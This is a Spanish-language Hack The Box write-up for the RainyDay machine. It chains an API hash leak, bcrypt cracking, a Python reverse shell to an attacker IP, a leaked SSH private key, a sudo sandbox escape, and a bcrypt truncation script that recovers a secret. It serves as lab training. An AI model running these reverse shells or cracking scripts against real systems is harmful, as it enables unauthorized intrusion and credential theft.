---
layout: single
title: RainyDay - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina RainyDay de Hackthebox en la cual vamos a conseguir hashes los cuales vamos a crackear para ingresar ala web y enviarnos una reverse shell con python3 y poder acceder a un docker consegiremos la id_rsa de un usuario para conectarnos por SSH despues de eso podremos migrar mediante una reverse shell a otro usuario gracias a un privilegio a nivel de sudoers para la escalada tendremos que aprovecharnos de bcrypt de python3 para poder saber el salt y crackear el hash de root"
date: 2024-01-01
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-rainyday/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Docker
  - Sudoers Privilege
  - Bcrypt Python
---

![](https://i.imgur.com/4bcd6C5.png)

## Recon

```bash
❯ nmap -sCV -p22,80 10.10.11.184 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-01 12:28 CST
Nmap scan report for 10.10.11.184
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:dd:e3:61:dc:5d:58:78:f8:81:dd:61:72:fe:65:81 (ECDSA)
|_  256 ad:bf:0b:c8:52:0f:49:a9:a0:ac:68:2a:25:25:cd:6d (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Agregamos el subdominio al **/etc/hosts** 

```bash
❯ echo "10.10.11.184 rainycloud.htb" | sudo tee -a /etc/hosts
10.10.11.184 rainycloud.htb
❯ ping -c 1 rainycloud.htb
PING rainycloud.htb (10.10.11.184) 56(84) bytes of data.
64 bytes from rainycloud.htb (10.10.11.184): icmp_seq=1 ttl=63 time=194 ms

--- rainycloud.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 194.061/194.061/194.061/0.000 ms
```

## Enumeracion

De primeras vemos que hay un nombre de un contenedor y hay un usuario

![](https://i.imgur.com/7Wo6tOi.png)

Vemos que nos dicen que como tal ofrecen contenedores Docker

![](https://i.imgur.com/7bb29ev.png)

Si vamos ala parte de **Login** vemos que como tal hay un panel de ***autenticacion*** pero solamente conocemos un usuario pero no su contraseña

![](https://i.imgur.com/VMf6MVc.png)

Si vamos a **/containers** vemos que nos redirige a otra ruta que es a **Login**

```bash
❯ curl -s http://10.10.11.184/containers
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://rainycloud.htb">http://rainycloud.htb</a>. If not, click the link.
```

![](https://i.imgur.com/Ky7XOL9.png)

De momento no vemos nada interante

![](https://i.imgur.com/HYtoOZV.png)

Vemos una ruta interesante llamada **api** 

```bash
❯ gobuster dir -u http://rainycloud.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rainycloud.htb
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/new                  (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 3254]
/register             (Status: 200) [Size: 3686]
/api                  (Status: 308) [Size: 239] [--> http://rainycloud.htb/api/]
/logout               (Status: 302) [Size: 189] [--> /]
```

Y bueno esto ya pinta interesante

![](https://i.imgur.com/q9VQAgA.png)

Vemos un solo contenedor

```bash
❯ curl -s http://rainycloud.htb/api/list
{"secrets":{"image":"alpine-python:latest","user":"jack"}}
```

Bueno solo vemos esto

```bash
❯ curl -s http://rainycloud.htb/api/healthcheck
{"result":true,"results":[]}
```

Y bueno para la parte de **user** vemos que se usa el parametro **id** entonces con esto podemos saber que como tal usan un identificador cada uno pueden ser numeros o sus nombres podemos probar desde consola para ver las respuestas que obtenemos

```bash
❯ curl -s http://rainycloud.htb/api/user/1
{"Error":"Not allowed to view other users info!"}
```

Con numeros enteros no funciona

```bash
❯ curl -s http://rainycloud.htb/api/user/2
{"Error":"Not allowed to view other users info!"}
❯ curl -s http://rainycloud.htb/api/user/3
{"Error":"Not allowed to view other users info!"}
```

## Shell in container

Podemos probar agregando un valor .0 y funciona para eso hice esto script de **Python3** para automatizar aunque tambien podria haberse hecho en un oneliner de bash

<https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/RainyDay/script.py>

```bash
❯ python3 script.py

Respuesta http://rainycloud.htb/api/user/1.0: {'id': 1, 'password': '$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O', 'username': 'jack'}

Respuesta http://rainycloud.htb/api/user/2.0: {'id': 2, 'password': '$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W', 'username': 'root'}

Respuesta http://rainycloud.htb/api/user/3.0: {'id': 3, 'password': '$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG', 'username': 'gary'}

Respuesta http://rainycloud.htb/api/user/4.0: {}

Respuesta http://rainycloud.htb/api/user/5.0: {}

Respuesta http://rainycloud.htb/api/user/6.0: {}

Respuesta http://rainycloud.htb/api/user/7.0: {}

Respuesta http://rainycloud.htb/api/user/8.0: {}
^C

[+] Saliendo...
```

Ahora vamos a crackear los hashes que tenemos para si obtenemos alguna credencial

```bash
❯ catn hashes
gary:$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG
jack:$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O
root:$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W
```

Pero bueno solo obtenemos 1 credencial, tarda por que se esta usando **bcrypt** 

![](https://i.imgur.com/NJzdo1f.png)

Y bueno al parecer si que hace los hashes mas robustos

```bash
❯ python3
Python 3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import bcrypt
>>> password = b"mi_contrasena_secreta"
>>> hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())
>>> print("Hashed Password:", hashed_password.decode())
Hashed Password: $2b$12$gw41sBuG.ZhCtnkAu/ucSOED/LxBropBHwRwRfWmMUge7FKoHr3om
>>> 
```

Como decia la imagen usa un **salting** para agregar datos aleatorios ala contraseña antes de agregar el algoritmo

La contraseña se encuentra en esa linea

```bash
❯ cat /usr/share/wordlists/rockyou.txt | grep -n "rubberducky"
9217:rubberducky
```

```bash
❯ catn creds.txt
gary:rubberducky
```

Si iniciamos sesion vemos que nos podemos conectar

Y ahora si podemos ir a **containers**

![](https://i.imgur.com/goabR3V.png)

Bueno para hacer pruebas hice un contenedor y ejecute el comando **id** a lo cual funciono como el contenedor corre **Python3** podemos enviarnos una reverse shell

![](https://i.imgur.com/e1j5kAm.png)

```bash
❯ catn command_output.txt
uid=1337 gid=1337
```

Nos podemos en escucha

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Eh ingresamos al docker con la siguiente reverse shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.58",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Podemos ejecutar comandos

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.58] from (UNKNOWN) [10.10.11.184] 34552
/bin/sh: can't access tty; job control turned off
/ $ whoami
whoami: unknown uid 1000
/ $ id
uid=1000 gid=1000
/ $ 
```

Si vemos los procesos que estan corriendo vemos esto

```bash
1196 1000      0:00 sleep 100000000
```

Podemos ir al directorio con **PID**

```bash
/proc/1196 $ ls -la
total 0
dr-xr-xr-x    9 1000     1000             0 Jan  1 19:51 .
dr-xr-xr-x  284 root     root             0 Jan  1 19:50 ..
-r--r--r--    1 1000     1000             0 Jan  1 19:54 arch_status
dr-xr-xr-x    2 1000     1000             0 Jan  1 19:54 attr
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 autogroup
-r--------    1 1000     1000             0 Jan  1 19:54 auxv
-r--r--r--    1 1000     1000             0 Jan  1 19:54 cgroup
--w-------    1 1000     1000             0 Jan  1 19:54 clear_refs
-r--r--r--    1 1000     1000             0 Jan  1 19:51 cmdline
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 comm
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 coredump_filter
-r--r--r--    1 1000     1000             0 Jan  1 19:54 cpu_resctrl_groups
-r--r--r--    1 1000     1000             0 Jan  1 19:54 cpuset
lrwxrwxrwx    1 1000     1000             0 Jan  1 19:54 cwd -> /home/jack
-r--------    1 1000     1000             0 Jan  1 19:54 environ
lrwxrwxrwx    1 1000     1000             0 Jan  1 19:54 exe -> /usr/bin/sleep
dr-x------    2 1000     1000             0 Jan  1 19:54 fd
dr-xr-xr-x    2 1000     1000             0 Jan  1 19:54 fdinfo
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 gid_map
-r--------    1 1000     1000             0 Jan  1 19:54 io
-r--r--r--    1 1000     1000             0 Jan  1 19:54 limits
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 loginuid
dr-x------    2 1000     1000             0 Jan  1 19:54 map_files
-r--r--r--    1 1000     1000             0 Jan  1 19:54 maps
-rw-------    1 1000     1000             0 Jan  1 19:54 mem
-r--r--r--    1 1000     1000             0 Jan  1 19:54 mountinfo
-r--r--r--    1 1000     1000             0 Jan  1 19:54 mounts
-r--------    1 1000     1000             0 Jan  1 19:54 mountstats
dr-xr-xr-x   54 1000     1000             0 Jan  1 19:54 net
dr-x--x--x    2 1000     1000             0 Jan  1 19:54 ns
-r--r--r--    1 1000     1000             0 Jan  1 19:54 numa_maps
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 oom_adj
-r--r--r--    1 1000     1000             0 Jan  1 19:54 oom_score
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 oom_score_adj
-r--------    1 1000     1000             0 Jan  1 19:54 pagemap
-r--------    1 1000     1000             0 Jan  1 19:54 patch_state
-r--------    1 1000     1000             0 Jan  1 19:54 personality
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 projid_map
lrwxrwxrwx    1 1000     1000             0 Jan  1 19:54 root -> /
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 sched
-r--r--r--    1 1000     1000             0 Jan  1 19:54 schedstat
-r--r--r--    1 1000     1000             0 Jan  1 19:54 sessionid
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 setgroups
-r--r--r--    1 1000     1000             0 Jan  1 19:54 smaps
-r--r--r--    1 1000     1000             0 Jan  1 19:54 smaps_rollup
-r--------    1 1000     1000             0 Jan  1 19:54 stack
-r--r--r--    1 1000     1000             0 Jan  1 19:51 stat
-r--r--r--    1 1000     1000             0 Jan  1 19:54 statm
-r--r--r--    1 1000     1000             0 Jan  1 19:54 status
-r--------    1 1000     1000             0 Jan  1 19:54 syscall
dr-xr-xr-x    3 1000     1000             0 Jan  1 19:54 task
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 timens_offsets
-r--r--r--    1 1000     1000             0 Jan  1 19:54 timers
-rw-rw-rw-    1 1000     1000             0 Jan  1 19:54 timerslack_ns
-rw-r--r--    1 1000     1000             0 Jan  1 19:54 uid_map
-r--r--r--    1 1000     1000             0 Jan  1 19:54 wchan
/proc/1196 $ 
```

Hay un enlace simbolico **cwd** que apunta a **/home/jack/** 

Vemos la flag

```bash
/proc/1196 $ cd cwd
sh: getcwd: No such file or directory
(unknown) $ ls
user.txt
sh: getcwd: No such file or directory
(unknown) $ 
```

## User.txt in container /home/jack

Podemos ver la flag

```bash
(unknown) $ cat user.txt
7b918794aebc6cfe1ee50120b1f12189
sh: getcwd: No such file or directory
(unknown) $ 
```

Vemos que hay un **.ssh** 

```bash
(unknown) $ ls -la
total 28
drwxr-x---    3 1000     1000          4096 Sep 29  2022 .
drwxr-xr-x    4 root     root          4096 Sep 29  2022 ..
lrwxrwxrwx    1 root     root             9 Sep 29  2022 .bash_history -> /dev/null
-rw-r--r--    1 1000     1000           220 Jan  6  2022 .bash_logout
-rw-r--r--    1 1000     1000          3771 Jan  6  2022 .bashrc
-rw-r--r--    1 1000     1000           807 Jan  6  2022 .profile
drwx------    2 1000     1000          4096 Sep 29  2022 .ssh
-rw-r-----    1 root     1000            33 Jan  1 18:24 user.txt
sh: getcwd: No such file or directory
(unknown) $ 
```

Y encontramos una **id_rsa**

```bash
(unknown) $ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA7Ce/LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq
qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow
SjS+Ew+ws4cpAdl/BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO
JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN/neeRPan3ue3iExiLdk7OA/8PkEVF0
/pLldRcUB09RUIoMPm8CR7ES/58p9MMHIHYWztcMtjz7mAfTcbwczq5YX3eNbHo9YFpo95
MqTueSxiSKsOQjPIpWPJ9LVHFyCEOW5ONR/NeWjxCEsaIz2NzFtPq5tcaLZbdhKnyaHE6k
m2eS8i8uVlMbY/XnUpRR1PKvWZwiqlzb4F89AkqnFooztdubdFbozV0vM7UhqKxtmMAtnu
a20uKD7bZV8W/rWvl5UpZ2A+0UEGicsAecT4kUghAAAFiHftftN37X7TAAAAB3NzaC1yc2
EAAAGBAOwnvywL62D/OKwGu0FOdWPh8VkQuapplV+MMIgrkJQ6s+97r0ZF6qnQ2w7UwpyV
FcDSSBa+MCDK1wDrxKdD02lGOccpNyluMfUtRqrvLFda37dxW+62NUcc1KMEo0vhMPsLOH
KQHZfwb6wq8PVhcBKu0HLJFAjjdeOTdOjSaj4Kie2deWetzTGylkYbyKD0TiQ4QGrpb8Yy
nSa+wKigJ7fqSCWA5A3gH2Lj2IISTf53nkT2p97nt4hMYi3ZOzgP/D5BFRdP6S5XUXFAdP
UVCKDD5vAkexEv+fKfTDByB2Fs7XDLY8+5gH03G8HM6uWF93jWx6PWBaaPeTKk7nksYkir
DkIzyKVjyfS1RxcghDluTjUfzXlo8QhLGiM9jcxbT6ubXGi2W3YSp8mhxOpJtnkvIvLlZT
G2P151KUUdTyr1mcIqpc2+BfPQJKpxaKM7Xbm3RW6M1dLzO1IaisbZjALZ7mttLig+22Vf
Fv61r5eVKWdgPtFBBonLAHnE+JFIIQAAAAMBAAEAAAGAB0Sd5JwlTWHte5Xlc3gXstBEXk
pefHktaLhm0foNRBKecRNsbIxAUaOk6krwBmOsPLf8Ef8eehPkFBotfjxfKFFJ+/Avy22h
yfrvvtkHk1Svp/SsMKeY8ixX+wBsiixPFprczOHUl1WGClVz/wlVqq2Iqs+3dyKRAUULhx
LaxDgM0KxVDTTTKOFnMJcwUIvUT9cPXHr8vqvWHFgok8gCEO379HOIEUlBjgiXJEGt9tP1
oge5WOnmwyIer2yNHweW26xyaSgZjZWP6z9Il1Gab0ZXRu1sZYadcEXZcOQT6frZhlF/Dx
pmgbdtejlRcUaI86mrwPFAP1PClLMlilroEaHCl8Dln5HEqnkpoNaJyg8di1pud+rJwlQw
ZyL6xnJ0Ke4ul3fDWpYnO/t8q5DQgnIhRKwyDGSM7M6DqBXi8CHSbPITzOMaiWgNzue49D
7ejAWa2sSlHJYhS0Uxpa7xQ3LslsnnysxIsZHKwmaMerKMGRmpoV2h5/VnXVeiEMIxAAAA
wQCoxMsk1JPEelb6bcWIBcJ0AuU5f16fjlYZMRLP75x/el1/KYo3J9gk+9BMw9AcZasX7Q
LOsbVdL45y14IIe6hROnj/3b8QPsmyEwGc13MYC0jgKN7ggUxkp4BPH4EPbPfouRkj7WWL
UwVjOxsPTXt2taMn5blhEF2+YwH5hyrVS2kW4CPYHeVMa1+RZl5/xObp/A62X/CWHY9CMI
nY9sRDI415LvIgofRqEdYgCdC6UaE/MSuDiuI0QcsyGucQlMQAAADBAPFAnhZPosUFnmb9
Plv7lbz9bAkvdcCHC46RIrJzJxWo5EqizlEREcw/qerre36UFYRIS7708Q9FELDV9dkodP
3xAPNuM9OCrD0MLBiReWq9WDEcmRPdc2nWM5RRDqcBPJy5+gsDTVANerpOznu7I9t5Jt+6
9Stx6TypwWshB+4pqECgiUfR8H1UNwSClU8QLVmDmXJmYScD/jTU4z3yHRaVzGinxOwDVG
PITC9yJXJgWTSFQC8UUjrqI7cRoFtI9QAAAMEA+pddCQ8pYvVdI36BiDG41rsdM0ZWCxsJ
sXDQ7yS5MmlZmIMH5s1J/wgL90V9y7keubaJxw1aEgXBa6HBuz8lMiAx7DgEMospHBO00p
92XFjtlFMwCX6V+RW+aO0D+mxmhgP3q3UDcVjW/Xar7CW57beLRFoyAyUS0YZNP7USkBZg
FXc7fxSlEqYqctfe4fZKBxV68i/c+LDvg8MwoA5HJZxWl7a9zWux7JXcrloll6+Sbsro7S
bU2hJSEWRZDLb9AAAADWphY2tAcmFpbnlkYXkBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
sh: getcwd: No such file or directory
(unknown) $ 
```

## SSH with jack

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
```

Y bueno vemos que funciona la **id_rsa**

```bash
❯ ssh -i id_rsa jack@10.10.11.184
The authenticity of host '10.10.11.184 (10.10.11.184)' can't be established.
ED25519 key fingerprint is SHA256:Viqe6Xw5EhBjOCOc4uT1fiK/9QOsIHMUDk9MwZi9YAQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.184' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon  1 Jan 20:00:06 UTC 2024

  System load:                      0.009765625
  Usage of /:                       65.6% of 5.13GB
  Memory usage:                     13%
  Swap usage:                       0%
  Processes:                        227
  Users logged in:                  0
  IPv4 address for br-a3f745892c3b: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.184
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:c446


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

jack@rainyday:~$ export TERM=xterm
jack@rainyday:~$ 
```

Vemos que hay un **safe_python** pero el problema es que nos tenemos que convertir en **jack_adm** para ejecutarlo 

```bash
jack@rainyday:/home$ sudo -l
Matching Defaults entries for jack on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on localhost:
    (jack_adm) NOPASSWD: /usr/bin/safe_python *
jack@rainyday:/home$ 
```

## Shell as jack_adm

Como podemos correr lo que sea con **jack_adm** podemos correr el siguiente script para convertirnos en el <https://github.com/kn32/python-buffered-reader-exploit/tree/master>

![](https://i.imgur.com/L5PndYX.png)

```bash
jack@rainyday:/dev/shm$ sudo -u jack_adm safe_python exploit.py 
[*] .dynamic:   0x55cde070ebe8
[*] DT_SYMTAB:  0x55cde01ad5f8
[*] DT_STRTAB:  0x55cde01ba300
[*] DT_RELA:    0x55cde0213560
[*] DT_PLTGOT:  0x55cde070ee08
[*] DT_INIT:    0x55cde0217000
[*] Found system at rela index 97
[*] Full RELRO binary, reading system address from GOT
[*] system:     0x7fc002f18d60
$ whoami
jack_adm
```

![](https://i.imgur.com/9IdAEWO.png)

Podemos enviar una reverse shell

![](https://i.imgur.com/l3yqENK.png)

>Antes de seguir yo hice la maquina hace mucho tiempo hay otra forma de ser **jack_adm** al igual que ser **jack_adm** en la pagina web para poder acceder en el panel de login para hacer eso hay que conseguir una **cookie** se tiene que usar **flask-unsign** y conseguir el **SECRET_KEY** ya que hay un subdominio **dev.rainyday.htb** solo que yo estoy mostrando la forma mas rapida y facil de conseguir la maquina si quieren ver esa parte al final del post les dejo otros writeups

Recuerden hacer esto

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo;fg
reset xterm
ENTER
```

## Escalada de privilegios

Esto es lo que contiene **safe_python**

```bash
jack_adm@rainyday:~$ cat /usr/bin/safe_python 
#!/usr/bin/python3

import os,sys

SAFE_FUNCTIONS = ["open", "print", "len", "id", "int", "bytearray", "range", "hex", "str"]
DANGEROUS_DEFAULTS = ["__import__", "__doc__", "__package__", "__loader__", "__spec__", "__name__"]

env = {}
env["locals"]   = None
env["globals"]  = None #{"__builtins__": {"open": open, "os": os}}
env["__name__"] = None
env["__file__"] = None
env["__builtins__"] = None
my_builtins = __builtins__.__dict__.copy()

for a in __builtins__.__dict__:
	if a in DANGEROUS_DEFAULTS:
		del my_builtins[a]
		continue

	if a.startswith("__") or a.lower() in SAFE_FUNCTIONS:
		continue

	del my_builtins[a]

env['__builtins__'] = my_builtins

with open(sys.argv[1]) as f:
	exec(f.read(), env)
jack_adm@rainyday:~$ 
```

Este script proporciona un entorno seguro ya que restringe el acceso a funciones peligrosas

Vemos que podemos correr como **root** este script

```bash
jack_adm@rainyday:/dev/shm$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py
jack_adm@rainyday:/dev/shm$ 
```

No tenemos permiso de ver el contenido

```bash
jack_adm@rainyday:/dev/shm$ cat /opt/hash_system/hash_password.py
cat: /opt/hash_system/hash_password.py: Permission denied
jack_adm@rainyday:/dev/shm$ 
```

Vemos que esta usando **Bcrypt** otra vez 

```bash
jack_adm@rainyday:/dev/shm$ sudo /opt/hash_system/hash_password.py
Enter Password> zi
[+] Hash: $2b$05$bnXMTogKKaFXK3tgReZp9Ov7I.F7Zv7PBF3az9niG4JNIu1pmS3te
jack_adm@rainyday:/dev/shm$ 
```

Si recordamos la explicacion necesitamos saber el salt antes de crakearla

En **bcrypt** hay un limite que es 72 bytes pero no nos deja introducir mas de 30 caracteres <https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length>

```bash
jack_adm@rainyday:/dev/shm$ sudo /opt/hash_system/hash_password.py
Enter Password> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Invalid Input Length! Must be <= 30 and >0
Enter Password> 
```

Debemos establecer una longitud de **71** bytes antes de llegar al maximo podemos utlizar este script que lo que hace es un ataque de fuerza bruta probando secuencialmente todas las combinaciones posibles de caracteres se usa **bcrypt.checkpw** para verificar si la contraseña coincide con el hash obtenido

![](https://i.imgur.com/EQ9yDP0.png)

Al ejecutar el siguiente script obtenemos el **secret**

```python
import os  
import string  
import bcrypt  
secret=""  
while True:  
    length=71-len(secret)  
    remainder=length%4  
    junk="😈"*int(length/4)  
    junk+= "A" *remainder  
  
    x=os.popen(f"echo {junk} | sudo /opt/hash_system/hash_password.py").read()  
    pwhash=x.split(": ")[1].strip()  
    for i in string.printable[:-6]:  
        password=f"{junk}{secret}{i}"  
        print(f"\r{secret}{i}",end="")  
        if bcrypt.checkpw(password.encode(),pwhash.encode()):  
            secret+=i  
            print(f"\r{secret}",end="")  
            break
```

![](https://i.imgur.com/Np2UNo3.png)

Tal vez la estructura del **hash** se pueda ver algo asi **$2b$05$H34vyR41n...** 

Ahora con esto podemos crackear el hash original de **root** que obtuvimos al principio

```bash
❯ catn roothash
root:$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W
```

Ahora podemos agregarla al **rocyou.txt** 

```bash
❯ sed 's/$/H34vyR41n/' /usr/share/wordlists/rockyou.txt > newwordlist.txt
```

Y Ahora lo crackeamos

```bash
❯ john --wordlist=newwordlist.txt roothash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
246813579H34vyR41n (root)     
1g 0:00:00:06 DONE (2024-01-01 16:51) 0.1445g/s 1373p/s 1373c/s 1373C/s exoticH34vyR41n..12356H34vyR41n
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ahora simplemente migramos a **root**

```bash
❯ ssh -i id_rsa jack@10.10.11.184
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon  1 Jan 22:52:55 UTC 2024

  System load:                      0.0537109375
  Usage of /:                       65.0% of 5.13GB
  Memory usage:                     12%
  Swap usage:                       0%
  Processes:                        231
  Users logged in:                  1
  IPv4 address for br-a3f745892c3b: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.184
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:5cca


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jan  1 22:06:55 2024 from 10.10.14.58
jack@rainyday:~$ su root                                                                                                       
Password: 
root@rainyday:/home/jack# 
```

## Root.txt && and final script

```bash
root@rainyday:~# cat root.txt 
4e1ed7b7565511857ef508bad0bc2685
root@rainyday:~# 
```

Aqui podemos ver el script que se usaba

```bash
root@rainyday:~# cat /opt/hash_system/hash_password.py 
#!/usr/bin/python3

import bcrypt
from config import SECRET

while True:
	user_input = input("Enter Password> ")
	if len(user_input) > 30 or len(user_input)==0:
		print("[+] Invalid Input Length! Must be <= 30 and >0")
	else:
		data = (user_input + SECRET).encode()
		hashed = bcrypt.hashpw(data, bcrypt.gensalt(rounds=5))
		print(f"[+] Hash: {hashed.decode()}")
		break
root@rainyday:~# 
```

## Extra information

- <https://7rocky.github.io/htb/rainyday/>
- <https://lander4k.github.io/posts/HTB-Rainyday/>
- <https://0xdf.gitlab.io/2023/02/18/htb-rainyday.html#shell-as-root>
- <https://youtu.be/E5TOeiCnGkE?si=1ahFA2Cu4JVhNnu4>
